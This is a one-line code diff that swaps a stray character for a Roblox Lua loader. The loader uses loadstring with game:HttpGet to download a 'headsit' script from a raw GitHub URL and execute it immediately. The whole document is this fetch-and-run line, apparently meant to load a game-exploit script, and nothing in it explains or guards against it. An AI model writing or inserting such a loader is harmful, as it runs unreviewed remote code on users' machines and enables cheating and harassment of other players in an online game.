@@ -1,1 +1,1 @@
-e
+loadstring(game:HttpGet("https://raw.githubusercontent.com/18drsl-bot/headsit-script-/refs/heads/main/lua%20code"))()
